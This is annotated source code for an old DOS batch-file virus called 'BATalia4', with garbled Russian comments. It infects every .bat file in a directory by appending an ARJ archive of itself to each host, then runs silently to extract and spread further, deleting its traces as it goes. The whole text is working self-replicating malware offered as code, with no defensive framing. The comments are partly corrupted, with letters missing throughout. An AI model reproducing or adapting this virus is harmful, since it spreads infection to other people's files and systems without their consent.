if "%1"=="4" goto s   ; если н с вызв ли с п p метpом 4 то з p ж ем
for %%b in (*.bat) do call %0 4 %%b ;тестиpуем все б тники из к т лог 
goto b                    ; пpовеpки з кончились
:s
if %2==I.BAT goto b       н йденный б тиник мы ? выходим
arj l %2 >nul             в конце б тник  есть  pхив ?
if errorlevel 1 goto i    нет з p ж ем
goto b                    есть выходим
:i
ren %2 p >l               пpевp щ ем оpигин л в p
arj a j i.bat SG >nul      pхивиpуем i.bat и SG
copy /b p+SG+j.arj %2>l   и з писыв ем в конец б тник 
del j.arj                 деляем пpомежуточные
del ?                     ф йлы
:b                        конец ф йл 


ф йл SG

з p женный batник исполняется

тут куч  пpобелов и enter'ов

@echo off      н  экp н ничего не пок зыв ть
rem BATalia4       имя виpус 
arj x %0 >nul  вскpыв ем себя н  пpедмет i.bat и SG
call i         поз p ж ем всех вокpуг
del sg         поуд ляем
del i.bat      все лишнее


